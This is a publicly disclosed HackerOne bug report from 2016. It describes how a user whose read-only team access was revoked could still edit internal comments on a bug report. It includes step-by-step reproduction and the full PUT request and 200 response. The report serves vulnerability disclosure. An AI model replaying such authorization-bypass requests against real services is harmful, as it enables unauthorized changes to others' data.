---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '119221'
original_report_id: '119221'
title: User with Read-Only permissions can edit the Internal comment Activities on
  Bug Reports After Revoke the team access permissions
weakness: Privilege Escalation
team_handle: security
created_at: '2016-02-28T03:58:04.718Z'
disclosed_at: '2016-04-01T10:56:51.997Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- privilege-escalation
---

# User with Read-Only permissions can edit the Internal comment Activities on Bug Reports After Revoke the team access permissions

## Metadata

- HackerOne Report ID: 119221
- Weakness: Privilege Escalation
- Program: security
- Disclosed At: 2016-04-01T10:56:51.997Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Poc :

1.Login into Program(testbug) as Alice account
2.Create a new group with "Read-only" Permission . Add a Bob to that group
3.Bob report a bug to Program(testbug) After Post "Some Internal comments"
4.Now Alice Revoke the Bob team access permissions so `Bob is no longer part of the team`
5.Bob escalate his privileges to edit the Internal comment Activities on Bug Reports by following Request 

PUT /activities/815794 HTTP/1.1
Host: hackerone.com
Connection: close
Content-Length: 402
Accept: application/json, text/javascript, */*; q=0.01
Origin: https://hackerone.com
<redacted>

{"id":815794,"is_internal":true,"editable":true,"type":"Activities::Comment","message":"bugtested","markdown_message":"<p>bugtested</p>\n","automated_response":false,"created_at":"2016-02-28T02:51:41.488Z","updated_at":"2016-02-28T02:51:41.488Z","actor":{"username":"Bob","url":"https://hackerone.com/Bob","profile_picture_urls":{"medium":"/assets/avatars/default-9e818ea07a7aa609d7d6dfa75612832e.png"}}}


Response :

HTTP/1.1 200 OK
Server: cloudflare-nginx
Date: Sun, 28 Feb 2016 02:53:28 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Status: 200 OK
<redacted>

{"id":815794,"is_internal":true,"editable":true,"type":"Activities::Comment","message":"bugtested","markdown_message":"\u003cp\u003ebugtested\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-28T02:51:41.488Z","updated_at":"2016-02-28T02:53:28.728Z","actor":{"username":"Bob","url":"https://hackerone.com/Bob","profile_picture_urls":{"medium":"/assets/avatars/default-9e818ea07a7aa609d7d6dfa75612832e.png"}}}

Regards,
techguynoob

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
